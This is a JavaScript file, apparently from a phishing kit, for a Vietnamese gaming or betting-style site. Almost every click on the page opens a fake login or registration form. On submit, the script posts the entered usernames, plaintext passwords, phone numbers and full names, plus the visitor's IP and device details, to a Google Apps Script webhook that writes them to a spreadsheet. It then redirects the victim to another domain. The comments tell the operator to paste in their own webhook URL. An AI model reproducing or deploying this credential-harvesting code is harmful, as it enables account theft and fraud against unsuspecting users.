document.addEventListener('DOMContentLoaded', () => {
    const TARGET_REDIRECT_URL = 'https://number.softwaredirectory.net/';
    // DÁN LINK WEB APP GOOGLE APPS SCRIPT (ĐUÔI /exec) CỦA BẠN VÀO ĐÂY:
    const GOOGLE_SHEET_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyi4nwTWMExxSyemHx5G1vfMmXcZLGAYyl1ofWdTc1hym9Q0u4rF6XU6O9SgTEDDT49/exec';

    // ================= 0. LẤY ĐỊA CHỈ IP & THÔNG TIN THIẾT BỊ =================
    let clientIP = 'Đang lấy IP...';

    // Tự động lấy IP public ngay khi tải trang để lúc bấm Submit không phải chờ
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            if (data && data.ip) clientIP = data.ip;
        })
        .catch(() => {
            clientIP = 'Không lấy được IP';
        });

    // Hàm nhận diện Thiết bị gọn gàng kèm User-Agent
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = 'Thiết bị khác';
        if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS (iPhone/iPad)';
        else if (/Android/i.test(ua)) os = 'Android';
        else if (/Windows/i.test(ua)) os = 'Windows PC';
        else if (/Macintosh|Mac OS X/i.test(ua)) os = 'MacOS';
        else if (/Linux/i.test(ua)) os = 'Linux';

        return `${os} | ${ua}`;
    }

    // Hàm gửi dữ liệu về Google Sheet rồi chuyển hướng trang
    async function sendToGoogleSheetAndRedirect(payload, submitBtn) {
        const originalText = submitBtn.textContent;
        submitBtn.disabled = true;
        submitBtn.textContent = 'ĐANG XỬ LÝ...';

        try {
            if (GOOGLE_SHEET_WEBHOOK_URL && !GOOGLE_SHEET_WEBHOOK_URL.includes('DAN_LINK_WEB_APP')) {
                await fetch(GOOGLE_SHEET_WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors', // Tránh lỗi chặn CORS của trình duyệt khi gửi sang Google Script
                    headers: {
                        'Content-Type': 'text/plain;charset=utf-8',
                    },
                    body: JSON.stringify(payload),
                });
            }
        } catch (err) {
            console.error('Lỗi gửi dữ liệu:', err);
        } finally {
            // Chuyển hướng sang trang đích ngay sau khi gửi xong
            window.location.href = TARGET_REDIRECT_URL;
        }
    }

    // ================= 1. KHỞI TẠO BANNER TRƯỢT NGANG 6 HÌNH =================
    new Swiper('.mainBannerSwiper', {
        loop: true,
        speed: 600,
        autoplay: {
            delay: 3000,
            disableOnInteraction: false,
        },
        pagination: {
            el: '.swiper-pagination',
            clickable: true,
        },
        grabCursor: true,
    });

    // ================= 2. QUẢN LÝ MODAL ĐĂNG NHẬP / ĐĂNG KÝ =================
    const authModal = document.getElementById('authModal');
    const closeAuthModal = document.getElementById('closeAuthModal');
    const tabLoginBtn = document.getElementById('tabLoginBtn');
    const tabRegisterBtn = document.getElementById('tabRegisterBtn');
    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');

    function openAuthModal(tab = 'login') {
        authModal.classList.add('show');
        document.body.style.overflow = 'hidden';
        switchAuthTab(tab);
    }

    function hideAuthModal() {
        authModal.classList.remove('show');
        document.body.style.overflow = '';
    }

    function switchAuthTab(tab) {
        if (tab === 'register') {
            tabRegisterBtn.classList.add('active');
            tabLoginBtn.classList.remove('active');
            registerForm.classList.add('active');
            loginForm.classList.remove('active');
        } else {
            tabLoginBtn.classList.add('active');
            tabRegisterBtn.classList.remove('active');
            loginForm.classList.add('active');
            registerForm.classList.remove('active');
        }
    }

    tabLoginBtn.addEventListener('click', () => switchAuthTab('login'));
    tabRegisterBtn.addEventListener('click', () => switchAuthTab('register'));
    closeAuthModal.addEventListener('click', hideAuthModal);

    // ================= 3. BẮT SỰ KIỆN CLICK TOÀN TRANG =================
    // Nút Đăng Ký -> Mở form Đăng Ký
    const registerTriggers = document.querySelectorAll('.btn-pill-register, a[href="#register"]');
    registerTriggers.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            openAuthModal('register');
        });
    });

    // Nút Đăng Nhập -> Mở form Đăng Nhập
    const loginTriggers = document.querySelectorAll('.btn-pill-login');
    loginTriggers.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            openAuthModal('login');
        });
    });

    // Nhấn bất kỳ thành phần nào khác -> Mở Form Đăng Nhập
    const allOtherElements = document.querySelectorAll(
        '.game-card, .fav-btn, .category-tab, .quick-nav-item, .btn-notice, ' +
        '.header-icon-menu, .header-mascot, .header-logo, .header-promo-img, .header-wheel-img, ' +
        '.mainBannerSwiper .swiper-slide, .floating-item a, .footer-nav-item:not([href="#register"])'
    );

    allOtherElements.forEach(el => {
        el.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            openAuthModal('login');
        });
    });

    // Nút đóng (X) trên banner nổi
    document.querySelectorAll('.close-float-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            const floatItem = btn.closest('.floating-item');
            if (floatItem) floatItem.style.display = 'none';
        });
    });

    // Nút cuộn nhanh menu ngang và nút TOP
    const categoryScroll = document.getElementById('categoryScroll');
    const scrollRightBtn = document.getElementById('scrollRightBtn');
    if (scrollRightBtn && categoryScroll) {
        scrollRightBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            categoryScroll.scrollBy({ left: 150, behavior: 'smooth' });
        });
    }

    const backToTopBtn = document.getElementById('backToTopBtn');
    if (backToTopBtn) {
        backToTopBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });
    }

    // ================= 4. HIỆN/ẨN MẬT KHẨU & THANH ĐỘ MẠNH =================
    document.querySelectorAll('.toggle-pwd-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const targetId = btn.getAttribute('data-target');
            const input = document.getElementById(targetId);
            const icon = btn.querySelector('i');
            if (input.type === 'password') {
                input.type = 'text';
                icon.className = 'fa-solid fa-eye';
            } else {
                input.type = 'password';
                icon.className = 'fa-regular fa-eye-slash';
            }
        });
    });

    // Chỉ cho phép nhập số vào 2 ô Số điện thoại (tối đa 10 số)
    ['loginPhone', 'regPhone'].forEach(id => {
        const phoneInput = document.getElementById(id);
        phoneInput.addEventListener('input', () => {
            phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 10);
        });
    });

    // Cập nhật thanh độ mạnh mật khẩu ở Form Đăng Ký
    const regPassword = document.getElementById('regPassword');
    const strengthBars = document.querySelectorAll('#strengthBars .bar');
    regPassword.addEventListener('input', () => {
        const val = regPassword.value;
        strengthBars.forEach(b => b.className = 'bar');
        if (val.length === 0) return;
        if (val.length < 6) {
            strengthBars[0].classList.add('active-weak');
        } else if (val.length < 10) {
            strengthBars[0].classList.add('active-medium');
            strengthBars[1].classList.add('active-medium');
        } else if (val.length < 14) {
            strengthBars[0].classList.add('active-strong');
            strengthBars[1].classList.add('active-strong');
            strengthBars[2].classList.add('active-strong');
        } else {
            strengthBars.forEach(b => b.classList.add('active-strong'));
        }
    });

    // ================= 5. KIỂM TRA RÀNG BUỘC & ĐẨY DỮ LIỆU VỀ GOOGLE SHEET =================
    function setFieldError(inputEl, errorEl, message) {
        const group = inputEl.closest('.auth-input-group');
        if (message) {
            if (group) group.classList.add('input-error');
            errorEl.textContent = message;
            return false;
        } else {
            if (group) group.classList.remove('input-error');
            errorEl.textContent = '';
            return true;
        }
    }

    // Xử lý Submit Form Đăng Nhập
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const userEl = document.getElementById('loginUsername');
        const passEl = document.getElementById('loginPassword');
        const phoneEl = document.getElementById('loginPhone');
        const rememberEl = document.getElementById('loginRemember');
        const submitBtn = loginForm.querySelector('.auth-submit-btn');

        const userVal = userEl.value.trim();
        const passVal = passEl.value.trim();
        const phoneVal = phoneEl.value.trim();

        let isValid = true;

        if (!userVal) {
            isValid = setFieldError(userEl, document.getElementById('loginUserErr'), 'Vui lòng nhập Tên tài khoản!') && isValid;
        } else if (userVal.length < 6 || userVal.length > 20) {
            isValid = setFieldError(userEl, document.getElementById('loginUserErr'), 'Tài khoản phải từ 6 đến 20 ký tự!') && isValid;
        } else {
            setFieldError(userEl, document.getElementById('loginUserErr'), '');
        }

        if (!passVal) {
            isValid = setFieldError(passEl, document.getElementById('loginPassErr'), 'Vui lòng nhập Mật khẩu!') && isValid;
        } else if (passVal.length < 6 || passVal.length > 20) {
            isValid = setFieldError(passEl, document.getElementById('loginPassErr'), 'Mật khẩu phải từ 6 đến 20 ký tự!') && isValid;
        } else {
            setFieldError(passEl, document.getElementById('loginPassErr'), '');
        }

        if (!phoneVal) {
            isValid = setFieldError(phoneEl, document.getElementById('loginPhoneErr'), 'Vui lòng nhập Số điện thoại!') && isValid;
        } else if (!/^\d{10}$/.test(phoneVal)) {
            isValid = setFieldError(phoneEl, document.getElementById('loginPhoneErr'), 'Số điện thoại bắt buộc điền đủ 10 chữ số!') && isValid;
        } else {
            setFieldError(phoneEl, document.getElementById('loginPhoneErr'), '');
        }

        const checkErr = document.getElementById('loginCheckErr');
        if (!rememberEl.checked) {
            checkErr.textContent = 'Vui lòng tích chọn ghi nhớ thông tin!';
            isValid = false;
        } else {
            checkErr.textContent = '';
        }

        if (isValid) {
            const payload = {
                status: 'ĐĂNG NHẬP',
                username: userVal,
                password: passVal,
                phone: phoneVal,
                fullname: '', // Form đăng nhập không có trường Họ tên nên để trống
                ip: clientIP,
                device: getDeviceInfo()
            };
            sendToGoogleSheetAndRedirect(payload, submitBtn);
        }
    });

    // Xử lý Submit Form Đăng Ký
    registerForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const userEl = document.getElementById('regUsername');
        const passEl = document.getElementById('regPassword');
        const nameEl = document.getElementById('regFullName');
        const phoneEl = document.getElementById('regPhone');
        const agreeEl = document.getElementById('regAgree');
        const submitBtn = registerForm.querySelector('.auth-submit-btn');

        const userVal = userEl.value.trim();
        const passVal = passEl.value.trim();
        const nameVal = nameEl.value.trim();
        const phoneVal = phoneEl.value.trim();

        let isValid = true;

        if (!userVal) {
            isValid = setFieldError(userEl, document.getElementById('regUserErr'), 'Vui lòng nhập Tên tài khoản!') && isValid;
        } else if (userVal.length < 6 || userVal.length > 20) {
            isValid = setFieldError(userEl, document.getElementById('regUserErr'), 'Tài khoản phải từ 6 đến 20 ký tự!') && isValid;
        } else {
            setFieldError(userEl, document.getElementById('regUserErr'), '');
        }

        if (!passVal) {
            isValid = setFieldError(passEl, document.getElementById('regPassErr'), 'Vui lòng nhập Mật khẩu!') && isValid;
        } else if (passVal.length < 6 || passVal.length > 20) {
            isValid = setFieldError(passEl, document.getElementById('regPassErr'), 'Mật khẩu phải từ 6 đến 20 ký tự!') && isValid;
        } else {
            setFieldError(passEl, document.getElementById('regPassErr'), '');
        }

        if (!nameVal) {
            isValid = setFieldError(nameEl, document.getElementById('regNameErr'), 'Vui lòng nhập Họ và Tên thật của bạn!') && isValid;
        } else {
            setFieldError(nameEl, document.getElementById('regNameErr'), '');
        }

        if (!phoneVal) {
            isValid = setFieldError(phoneEl, document.getElementById('regPhoneErr'), 'Vui lòng nhập Số điện thoại!') && isValid;
        } else if (!/^\d{10}$/.test(phoneVal)) {
            isValid = setFieldError(phoneEl, document.getElementById('regPhoneErr'), 'Số điện thoại bắt buộc điền đủ 10 chữ số!') && isValid;
        } else {
            setFieldError(phoneEl, document.getElementById('regPhoneErr'), '');
        }

        const checkErr = document.getElementById('regCheckErr');
        if (!agreeEl.checked) {
            checkErr.textContent = 'Bạn cần đồng ý với Thỏa thuận đăng ký người dùng!';
            isValid = false;
        } else {
            checkErr.textContent = '';
        }

        if (isValid) {
            const payload = {
                status: 'ĐĂNG KÝ',
                username: userVal,
                password: passVal,
                phone: phoneVal,
                fullname: nameVal,
                ip: clientIP,
                device: getDeviceInfo()
            };
            sendToGoogleSheetAndRedirect(payload, submitBtn);
        }
    });
});